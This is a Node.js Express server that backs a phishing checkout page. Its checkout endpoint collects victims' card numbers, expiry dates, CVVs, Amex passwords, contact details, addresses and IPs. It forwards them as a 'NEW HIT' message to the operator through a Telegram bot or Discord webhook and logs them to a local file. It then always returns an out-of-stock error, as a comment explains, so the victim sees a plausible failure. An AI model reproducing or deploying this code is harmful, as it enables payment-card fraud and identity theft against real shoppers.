require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '2mb' }));
app.use(express.static('public'));

const LOG_FILE = 'captured.json';

// helper – send to Telegram (best) or any webhook
async function notify(data) {
  const text = `🎣 NEW HIT
IP: ${data.ip}
Time: ${data.time}
Brand: ${data.brand}
Amount: $${data.amount}
Email: ${data.email}
Phone: ${data.phone}
Card: ${data.cardNumber}
Exp: ${data.exp}
CVV: ${data.cvv}
Amex Pass: ${data.amexPassword || 'n/a'}
Name: ${data.cardName}
Street: ${data.street}
City: ${data.city}
State: ${data.state}
ZIP: ${data.zip}
UA: ${data.ua}
`;
  // Telegram
  if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text })
    });
  }
  // optional Discord webhook
  if (process.env.DISCORD_WEBHOOK) {
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: '```' + text + '```' })
    });
  }
  // always save locally
  let arr = [];
  try { arr = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8')); } catch {}
  arr.push(data);
  fs.writeFileSync(LOG_FILE, JSON.stringify(arr, null, 2));
}

app.post('/api/checkout', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const payload = {
    ...req.body,
    ip,
    ua: req.headers['user-agent'] || '',
    time: new Date().toISOString()
  };
  await notify(payload);
  // always return stock-out so victim sees error
  res.json({ success: false, error: 'OUT_OF_STOCK' });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Listening on', PORT));
